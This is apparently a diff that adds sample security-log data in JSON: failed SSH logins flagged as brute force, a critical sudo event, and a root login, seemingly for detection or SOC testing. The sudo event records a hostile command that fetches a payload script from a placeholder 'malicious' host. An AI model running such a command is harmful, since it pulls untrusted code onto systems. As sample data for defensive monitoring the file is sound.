@@ -1,1 +1,10 @@
+[
+{"timestamp":"2026-05-06T10:05:00","hostname":"soc-server","event_type":"ssh_failed_login","user":"root","src_ip":"45.155.205.233","src_port":55221,"message":"Failed password for root from 45.155.205.233 port 55221 ssh2","severity":"high","tags":["possible_bruteforce"]},
 
+{"timestamp":"2026-05-06T10:05:05","hostname":"soc-server","event_type":"ssh_failed_login","user":"admin","src_ip":"91.134.182.120","src_port":44112,"message":"Failed password for admin from 91.134.182.120 port 44112 ssh2","severity":"high","tags":["possible_bruteforce"]},
+
+{"timestamp":"2026-05-06T10:05:10","hostname":"soc-server","event_type":"sudo_activity","user":"ubuntu","command":"wget http://malicious/payload.sh","message":"Suspicious sudo command execution","severity":"critical","tags":["suspicious_command","sudo_activity"]},
+
+{"timestamp":"2026-05-06T10:05:15","hostname":"soc-server","event_type":"root_login","user":"root","src_ip":"192.168.1.66","message":"Root login detected","severity":"critical","tags":["root_login_detected"]}
+
+]
